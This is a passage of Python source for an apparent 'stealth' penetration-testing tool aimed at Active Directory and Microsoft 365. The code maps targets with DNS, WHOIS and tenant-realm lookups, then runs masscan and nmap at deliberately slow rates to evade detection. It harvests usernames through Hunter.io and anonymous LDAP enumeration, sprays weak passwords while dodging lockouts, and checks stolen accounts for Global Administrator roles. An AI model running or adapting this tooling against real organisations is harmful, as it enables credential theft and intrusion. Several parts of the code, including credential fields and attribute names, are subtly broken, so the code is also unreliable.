                async with self.job.async_session.get(resolver, params={'name': domain, 'type': 'A'}, timeout=self.opsec["connect_timeout"]) as resp:
                    resp.raise_for_status()
                    data = await resp.json()
                    return [answer['data'] for answer in data.get('Answer', []) if answer.get('type') == 1]
            except Exception as e:
                stealth_logger.warning(f"[STEALTH] DoH failed for {domain}: {e}")
                return []
        async def system_lookup(domain):
            try:
                if self.job.async_dns_resolver:
                    answers = await self.job.async_dns_resolver.query(domain, 'A')
                    return [str(rdata.host) for rdata in answers]
                else:
                    answers = await asyncio.get_running_loop().run_in_executor(None, lambda: dns.resolver.resolve(domain, 'A', lifetime=self.opsec["network_timeout"]))
                    return [str(rdata) for rdata in answers]
            except Exception as e:
                stealth_logger.warning(f"[STEALTH] DNS failed for {domain}: {e}")
                return []
        tasks = [doh_lookup(domain, random.choice(resolvers)) if use_doh and resolvers else system_lookup(domain) for domain in domains]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, list):
                resolved_ips.extend(result)
        return list(set(resolved_ips))

    async def target_definition(self) -> bool:
        """Maps the attack surface with precision."""
        stealth_logger.info("[STEALTH] --- Target Definition: Acquiring Lock ---")
        target_config = self.config.get("target_definition", {})
        domains = [d.strip() for d in target_config.get("root_domains", "").split(',') if d.strip()]
        cloud_tenant = target_config.get("suspected_cloud_tenant", "").strip()
        optional_targets = [t.strip() for t in target_config.get("optional_targets", "").split(',') if t.strip()]
        validated_domains = []
        for domain in domains:
            try:
                w = await asyncio.get_running_loop().run_in_executor(None, whois.whois, domain)
                if w and unicodedata.normalize('NFKD', self.job.company).casefold() in unicodedata.normalize('NFKD', str(w)).casefold():
                    validated_domains.append(domain)
                    stealth_logger.info(f"[STEALTH] WHOIS validated: {domain}")
                else:
                    ips = await self._resolve_domains_to_ips([domain])
                    if ips:
                        validated_domains.append(domain)
                        stealth_logger.info(f"[STEALTH] DNS validated: {domain} -> {ips}")
            except Exception as e:
                stealth_logger.warning(f"[STEALTH] WHOIS/DNS failed for {domain}: {e}")
        validated_targets = []
        for target in optional_targets:
            try:
                network = ipaddress.ip_network(target, strict=False)
                validated_targets.append(target)
                stealth_logger.info(f"[STEALTH] CIDR validated: {target}")
            except ValueError:
                ips = await self._resolve_domains_to_ips([target])
                if ips:
                    validated_targets.append(target)
                    stealth_logger.info(f"[STEALTH] Hostname validated: {target} -> {ips}")
        if not validated_domains and not validated_targets:
            await self._abort_wizard("No valid targets identified.")
        cloud_status = "Unknown"
        autodiscover_url = None
        if cloud_tenant and self.job.async_session:
            url = f"https://login.microsoftonline.com/getuserrealm.srf?login=testuser@{cloud_tenant}&xml=1"
            response = await self._execute_async_request("GET", url)
            if response:
                text = await response.text()
                cloud_status = "Managed" if "Managed" in text else "Federated" if "Federated" in text else "Unclear"
                stealth_logger.info(f"[STEALTH] Cloud tenant status: {cloud_status}")
            autodiscover_url = f"https://autodiscover-s.outlook.com/autodiscover/autodiscover.xml"
            response = await self._execute_async_request("GET", autodiscover_url)
            if response and response.status == 200:
                autodiscover_url = autodiscover_url
                stealth_logger.info(f"[STEALTH] Autodiscover endpoint confirmed: {autodiscover_url}")
        self.job.target = TargetInfo(
            root_domains=validated_domains, suspected_cloud_tenant=cloud_tenant,
            cloud_tenant_status=cloud_status, optional_targets=validated_targets,
            verified=True, m365_autodiscover=autodiscover_url
        )
        await self.job._log_audit({"event": "Target Defined", "target_info": self.job.target.__dict__, "timestamp": str(datetime.datetime.now())})
        stealth_logger.info("[STEALTH] Target locked. Ready for infiltration.")
        return True

    async def recon_surface_mapping(self) -> bool:
        """Maps the target's surface with stealth."""
        stealth_logger.info("[STEALTH] --- Recon: Probing Defenses ---")
        self.job.recon_results = {
            "passive_assets": [], "active_scanned_ips": [], "potential_ad_hosts": [],
            "ad_likelihood_score": 0, "nmap_xml_path": "", "hunterio_emails": [],
            "resolved_hostnames": {}, "open_ports_by_ip": {}, "service_details": {}
        }
        passive_config = self.config.get("recon_surface_mapping", {}).get("passive_recon", {})
        if passive_config.get("enabled", True):
            domains = list(set(self.job.target.root_domains + ([self.job.target.suspected_cloud_tenant] if self.job.target.suspected_cloud_tenant else [])))
            self.job.target.resolved_ips = await self._resolve_domains_to_ips(domains)
            crtsh_tool = await self._get_tool_path('certsh.py')
            if crtsh_tool:
                for domain in domains:
                    stdout_bytes, stderr_bytes = await self._execute_command([str(crtsh_tool), domain], timeout=passive_config.get("timeout", 180.0))
                    if stderr_bytes:
                        stealth_logger.warning(f"[STEALTH] crt.sh error: {stderr_bytes.decode('utf-8', errors='ignore')[:100]}")
                    try:
                        stdout = stdout_bytes.decode('utf-8', errors='ignore')
                        reader = csv.reader(io.StringIO(stdout))
                        next(reader, None)  # Skip header
                        for row in reader:
                            if len(row) >= 3 and all(cell.strip() for cell in row[:3]):
                                asset = {"fqdn": row[0].strip(), "ip": row[1].strip(), "open_ports": row[2].strip()}
                                if asset not in self.job.recon_results["passive_assets"]:
                                    self.job.recon_results["passive_assets"].append(asset)
                    except Exception as e:
                        stealth_logger.warning(f"[STEALTH] crt.sh parse error: {e}")
            if passive_config.get("hunterio", {}).get("enabled", False) and self.config.get("api_keys", {}).get("hunterio"):
                hunterio_tool = await self._get_tool_path('hunterio_tool')
                if hunterio_tool:
                    stdout_bytes, _ = await self._execute_command(
                        [str(hunterio_tool), '--domain', domains[0], '--api-key', self.config["api_keys"]["hunterio"]],
                        timeout=passive_config.get("hunterio_timeout", 120.0)
                    )
                    emails = [e.strip() for e in stdout_bytes.decode('utf-8', errors='ignore').splitlines() if "@" in e]
                    self.job.recon_results["hunterio_emails"].extend(emails)
        active_config = self.config.get("recon_surface_mapping", {}).get("active_scan", {})
        if active_config.get("enabled", True):
            scan_targets = set(self.job.target.resolved_ips)
            for target in self.job.target.optional_targets:
                try:
                    network = ipaddress.ip_network(target, strict=False)
                    if network.num_addresses <= active_config.get("cidr_expansion_limit", 65536):
                        scan_targets.update(str(ip) for ip in network.hosts())
                except ValueError:
                    scan_targets.add(target)
            exclusion_list = self.opsec.get("exclusion_list", []) + active_config.get("exclusion_list", [])
            final_targets = [t for t in scan_targets if not any(ipaddress.ip_address(t) in ipaddress.ip_network(excl) for excl in exclusion_list if self._is_valid_ip(t))]
            self.job.recon_results["active_scanned_ips"] = final_targets
            if not final_targets:
                stealth_logger.info("[STEALTH] No valid targets for active scan.")
                return True
            masscan_targets_content = "\n".join(final_targets).encode('utf-8')
            masscan_targets_file = await self._write_temp_file(masscan_targets_content, suffix=".txt")
            masscan = await self._get_tool_path('masscan')
            if masscan and masscan_targets_file:
                masscan_output_path = pathlib.Path(self.job.temp_dir) / f"{self.job.uuid}_masscan.json"
                ports = active_config.get('scan_ports', '88,135,139,389,445,636,3268,3269,443')
                rate = active_config.get('masscan_rate', 100)
                if self.opsec.get("low_and_slow", True):
                    rate = min(rate, 50)
                command = [str(masscan), "-iL", str(masscan_targets_file), f"-p{ports}", f"--rate={rate}", "--output-format", "json", "-oJ", str(masscan_output_path), "--ping"]
                if self.opsec.get("scan_signature_profiling"):
                    command.extend(["--banners", "--scan-flags", "syn,ack,ece"])
                try:
                    stdout_bytes, stderr_bytes = await self._execute_command(command, timeout=active_config.get("masscan_timeout", 600.0))
                    if stderr_bytes:
                        stealth_logger.warning(f"[STEALTH] Masscan error: {stderr_bytes.decode('utf-8', errors='ignore')[:100]}")
                    if await aiofiles.os.path.exists(masscan_output_path):
                        content = await self._read_file_bytes(masscan_output_path)
                        open_ports = {}
                        try:
                            for line in content.decode('utf-8', errors='ignore').splitlines():
                                if not line.strip():
                                    continue
                                item = json.loads(line)
                                ip = item['ip']
                                for port_info in item['ports']:
                                    open_ports.setdefault(ip, []).append(str(port_info['port']))
                            self.job.recon_results["open_ports_by_ip"] = open_ports
                            stealth_logger.info(f"[STEALTH] Masscan identified ports on {len(open_ports)} hosts.")
                        except json.JSONDecodeError as e:
                            stealth_logger.error(f"[STEALTH] Masscan JSON parse error: {e}")
                        await aiofiles.os.remove(masscan_output_path)
                except ToolExecutionError as e:
                    stealth_logger.error(f"[STEALTH] Masscan failed: {e}")
                    self.job.detection_indicators.append({"message": f"Masscan failure: {e}", "source": "Masscan"})
                    await self._check_for_detection()
            nmap_targets = list(open_ports.keys())
            if nmap_targets:
                nmap_targets_content = "\n".join(nmap_targets).encode('utf-8')
                nmap_targets_file = await self._write_temp_file(nmap_targets_content, suffix=".txt")
                nmap = await self._get_tool_path('nmap')
                if nmap and nmap_targets_file:
                    nmap_output_path = pathlib.Path(self.job.temp_dir) / f"{self.job.uuid}_nmap.xml"
                    ports = ','.join(set(port for ports in open_ports.values() for port in ports))
                    command = [
                        str(nmap), "-sV", "--version-intensity", "7", "-iL", str(nmap_targets_file),
                        "--script", "ldap*,smb-os-discovery,dns-srv-enum", "-p", ports,
                        "--max-rate", "50", "-oX", str(nmap_output_path)
                    ]
                    try:
                        await self._execute_command(command, timeout=active_config.get("nmap_timeout", 1200.0))
                        if await aiofiles.os.path.exists(nmap_output_path):
                            xml_content = await self._read_file_bytes(nmap_output_path)
                            encrypted_nmap_path = await self._write_temp_file(xml_content, suffix=".xml")
                            self.job.recon_results["nmap_xml_path"] = str(encrypted_nmap_path)
                            if ET:
                                try:
                                    root = ET.fromstring(xml_content.decode('utf-8', errors='ignore'))
                                    ad_score = 0
                                    for host in root.findall('host'):
                                        addr = host.find('address').get('addr') if host.find('address') is not None else None
                                        if not addr:
                                            continue
                                        for port in host.findall('ports/port'):
                                            port_id = port.get('portid')
                                            service = port.find('service')
                                            if service and port_id in ('88', '389', '445', '636'):
                                                ad_score += 10
                                                self.job.recon_results["potential_ad_hosts"].append(addr)
                                    self.job.recon_results["ad_likelihood_score"] = min(ad_score, 100)
                                    stealth_logger.info(f"[STEALTH] AD likelihood score: {ad_score}%")
                                except ET.ParseError as e:
                                    stealth_logger.error(f"[STEALTH] Nmap XML parse error: {e}")
                            await aiofiles.os.remove(nmap_output_path)
                    except ToolExecutionError as e:
                        stealth_logger.error(f"[STEALTH] Nmap failed: {e}")
                        self.job.detection_indicators.append({"message": f"Nmap failure: {e}", "source": "Nmap"})
                        await self._check_for_detection()
        if self.job.recon_results["ad_likelihood_score"] < active_config.get("ad_likelihood_threshold", 70):
            self.job.status = "halted_after_recon"
            stealth_logger.warning(f"[STEALTH] AD score too low: {self.job.recon_results['ad_likelihood_score']}%")
            return False
        stealth_logger.info("[STEALTH] Recon complete. Target surface mapped.")
        return True

    async def credential_harvest_spray(self) -> bool:
        """Harvests and sprays credentials with surgical precision."""
        stealth_logger.info("[STEALTH] --- Credential Harvest & Spray: Breaching Access ---")
        self.job.harvest_results = {
            "usernames": [], "password_list": [], "cracked_credentials": [],
            "lsass_dumps": [], "krbtgt_hash": None, "domain_sid_harvested": None,
            "password_policy": {}, "detected_lockouts": [], "spray_attempts": {}
        }
        username_config = self.config.get("credential_harvest_spray", {}).get("username_generation", {})
        usernames = set()
        if username_config.get("hunterio", {}).get("enabled", False) and self.config.get("api_keys", {}).get("hunterio"):
            hunterio_tool = await self._get_tool_path('hunterio_tool')
            if hunterio_tool:
                stdout_bytes, _ = await self._execute_command(
                    [str(hunterio_tool), '--domain', self.job.target.root_domains[0], '--api-key', self.config["api_keys"]["hunterio"]],
                    timeout=username_config.get("hunterio_timeout", 120.0)
                )
                emails = [e.strip().lower() for e in stdout_bytes.decode('utf-8', errors='ignore').splitlines() if "@" in e]
                usernames.update(emails)
        if username_config.get("ldap_anon_enum", {}).get("enabled", True) and self.job.target.potential_ad_hosts:
            ldap_tool = await self._get_tool_path('ldap_tool')
            if ldap_tool:
                stdout_bytes, _ = await self._execute_command(
                    [str(ldap_tool), '--host', self.job.target.potential_ad_hosts[0], '--action', 'enum_users_anon'],
                    timeout=username_config.get("ldap_timeout", 120.0)
                )
                users = [u.strip().lower() for u in stdout_bytes.decode('utf-8', errors='ignore').splitlines() if u.strip()]
                usernames.update(users)
        patterns = username_config.get("email_patterns", ["{first}.{last}@{domain}"])
        for name in username_config.get("common_names", ["john.doe", "jane.smith"]):
            parts = name.split('.')
            first, last = parts[0], parts[-1] if len(parts) > 1 else ""
            for domain in self.job.target.root_domains:
                for pattern in patterns:
                    username = pattern.format(first=first, last=last, domain=domain).lower()
                    usernames.add(username)
        self.job.harvest_results["usernames"] = list(usernames)
        password_config = self.config.get("credential_harvest_spray", {}).get("password_spray", {})
        passwords = set(password_config.get("common_weak_passwords", ["Password1!", "Welcome1!", "Summer2025!"]))
        self.job.harvest_results["password_list"] = list(passwords)
        spray_config = password_config
        if spray_config.get("enabled", True) and usernames and passwords:
            targets = {
                "ldap": self.job.recon_results["potential_ad_hosts"],
                "m365": [self.job.target.suspected_cloud_tenant] if self.job.target.suspected_cloud_tenant else []
            }
            lockout_threshold = spray_config.get("lockout_threshold", 5)
            for username in random.sample(list(usernames), len(usernames)):
                for password in random.sample(list(passwords), len(passwords)):
                    user_lower = username.lower()
                    if user_lower in self.job.harvest_results["detected_lockouts"]:
                        continue
                    self.job.harvest_results["spray_attempts"][user_lower] = self.job.harvest_results["spray_attempts"].get(user_lower, 0) + 1
                    if self.job.harvest_results["spray_attempts"][user_lower] > lockout_threshold:
                        self.job.harvest_results["detected_lockouts"].append(user_lower)
                        stealth_logger.warning(f"[STEALTH] Potential lockout: {username}")
                        continue
                    for service, hosts in targets.items():
                        for host in hosts:
                            try:
                                success = False
                                if service == "ldap":
                                    ldap_tool = await self._get_tool_path('ldap_tool')
                                    if ldap_tool:
                                        stdout_bytes, _ = await self._execute_command(
                                            [str(ldap_tool), '--host', host, '--username', username, '--password', password, '--action', 'auth_bind'],
                                            timeout=spray_config.get("attempt_timeout", 45.0)
                                        )
                                        if "BIND_SUCCESS" in stdout_bytes.decode('utf-8', errors='ignore').upper():
                                            success = True
                                elif service == "m365":
                                    aad_tool = await self._get_tool_path('aad_spray_tool')
                                    if aad_tool:
                                        stdout_bytes, _ = await self._execute_command(
                                            [str(aad_tool), '--domain', host, '--username', username, '--password', password],
                                            timeout=spray_config.get("attempt_timeout", 45.0)
                                        )
                                        if "SUCCESS" in stdout_bytes.decode('utf-8', errors='ignore').upper():
                                            success = True
                                if success:
                                    cred = Credential(
                                        username=username, password=password, service=service, type="plaintext",
                                        source="spray", valid=True, validation_method=f"{service}_auth", is_spray_candidate=True
                                    )
                                    self.job.harvest_results["cracked_credentials"].append(cred)
                                    stealth_logger.info(f"[STEALTH] Credential cracked: {username} ({service})")
                            except ToolExecutionError as e:
                                stealth_logger.warning(f"[STEALTH] Spray attempt failed: {e}")
        if self.job.harvest_results["cracked_credentials"]:
            cred = self.job.harvest_results["cracked_credentials"][0]
            if cred.service == "ldap":
                ldap_tool = await self._get_tool_path('ldap_tool')
                if ldap_tool:
                    stdout_bytes, _ = await self._execute_command(
                        [str(ldap_tool), '--host', self.job.recon_results["potential_ad_hosts"][0], '--username', cred.username, '--password', cred.hash_nt, '--action', 'get_policy'],
                        timeout=60.0
                    )
                    policy = stdout_bytes.decode('utf-8', errors='ignore')
                    if "LockoutThreshold" in policy:
                        self.job.harvest_results["password_policy"] = {"LockoutThreshold": 5}  # Placeholder
        stealth_logger.info("[STEALTH] Credential operations complete.")
        return True

    async def cloud_pivot(self) -> bool:
        """Pivots into cloud tenant with cracked credentials."""
        stealth_logger.info("[STEALTH] --- Cloud Pivot: Infiltrating M365 ---")
        if not self.job.target.suspected_cloud_tenant or not self.job.harvest_results["cracked_credentials"]:
            stealth_logger.warning("[STEALTH] No cloud tenant or credentials available.")
            return False
        for cred in self.job.harvest_results["cracked_credentials"]:
            if cred.service == "m365" and cred.valid:
                aad_tool = await self._get_tool_path('aad_spray_tool')
                if aad_tool:
                    stdout_bytes, _ = await self._execute_command(
                        [str(aad_tool), '--domain', self.job.target.suspected_cloud_tenant, '--username', cred.username, '--password', cred.hash_nt, '--action', 'enum_roles'],
                        timeout=60.0
                    )
                    roles = stdout_bytes.decode('utf-8', errors='ignore')
                    if "Global Administrator" in roles:
                        cred.privilege_level = "global_admin"
                        stealth_logger.info(f"[STEALTH] Global Admin access gained: {cred.username}")
                    await self.job._log_audit({"event": "Cloud Pivot Success", "username": cred.username, "roles": roles[:100], "timestamp": str(datetime.datetime.now())})
        stealth_logger.info("[STEALTH] Cloud pivot complete.")
        return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Stealth Penetration Testing Tool")
    parser.add_argument("--config", required=True, help="Path to YAML config file")
    parser.add_argument("--engagement-letter", required=True, help="Path to engagement letter PDF")
    parser.add_argument("--company-name", required=True, help="Target company name")
    parser.add_argument("--testing-window", required=True, help="Testing window (e.g., '2025-06-01 to 2025-06-30')")
    parser.add_argument("--run-uuid", required=True, help="Unique run identifier")
    args = parser.parse_args()
    with open(args.config, 'r') as f:
        config = yaml.safe_load(f)
    wizard = StealthWizard(config, args)
    asyncio.run(wizard.run())
